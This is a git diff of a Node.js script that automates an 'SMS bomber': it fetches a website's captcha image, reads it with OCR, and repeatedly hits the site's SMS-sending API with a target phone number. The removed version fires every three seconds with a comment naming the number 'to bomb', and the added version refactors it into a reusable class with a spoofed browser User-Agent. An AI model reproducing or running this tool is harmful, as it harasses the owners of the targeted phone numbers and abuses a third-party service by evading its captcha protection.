@@ -1,72 +1,51 @@
+
 var request = require('superagent');
 
-var cheerio = require('cheerio');
+var utils = require('./utils');
 
-var decode = require('./decode');
+var phone = '13105625814';
 
-var count = 0;
+function Sms(options,param){
+  this.options = Object.assign({imgMethod:'GET',imgHandle:true,imgValue:55,sendMethod:'GET'}, options);
+  this.param = new Object();
+  this.param.query = param;
 
-//step1 获取验证码
+  this.start = function(){
 
-//step2 解析验证码
+    var data = new Object();
 
-//step3 发送请求
+    var self = this;
 
-var handleYsale = function(){
+    utils.req(this.options.imgMethod,this.options.imgUrl,null,handleImg,function(){
+      console.log('验证码获取失败');
+    });
 
-	var param = new Object();
-	param.cookie = "";
+    //处理验证码
+    function handleImg(cookie,result){
+      var buffer = result.body;
+      utils.readImg(buffer,self.options.imgHandle,self.options.imgValue,function(text){
+        self.send(cookie,text);
+      })
+    }
 
-	var loadPage = function(){
+  }
 
-		request.get("http://app.ysale.cn/jyz5/HTML/result.html").end(function(err,result){
-			if(err || !result.ok) result;
+  this.send = function(cookie,text){
 
-			var $ = cheerio.load(result.text);
+    utils.updateObj(text,this.options.phone,this.param.query);
 
-			var src = $('img[name=vcodepic]').attr('src');				
+    this.param.set = {Cookie:cookie,'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36'};
 
-			decode(param,handleCode);
+    utils.req(this.options.sendMethod,this.options.sendUrl,this.param,function(cookie,result){
+      console.log(result.text);
+    },function(){
+      console.log('验证码获取失败');
+    });
+  }
+}
 
-		});
+var option1 = {imgUrl:'http://app.ysale.cn/jyz5/PHP/verifycode.php',sendUrl:'http://app.ysale.cn/jyz5/PHP/api.php',phone:phone};
+var data1 = new Object({vcode:null,phone:null,act:'recvphone'});
+var sms1 = new Sms(option1,data1);
 
-	}
-
-	var handleCode = function(text){
-		
-		text = text.trim();
-
-		if(text.length == 4){
-			param.vcode = text;
-			param.phone = 18345154111;	//需要轰炸的手机号码
-			param.act = "recvphone";
-			handle();
-		}
-	}
-
-	var handle = function(){
-
-		var cookie = param.cookie;
-
-		delete(param.cookie);	//移除 cookie 属性
-
-		request.get("http://app.ysale.cn/jyz5/PHP/api.php").set({Cookie:cookie}).query(param).end(function(err,result){
-			var v = eval('(' + result.text + ')');
-			if(v.msg == 'success'){
-				count++;
-				console.log("第 " + count + " 次发送: success" );
-			}
-		})
-
-	}
-
-	return {
-		init: function(){
-			loadPage();
-		}
-	}
-
-};
-
-setInterval(handleYsale().init,3000);
-
+sms1.start();
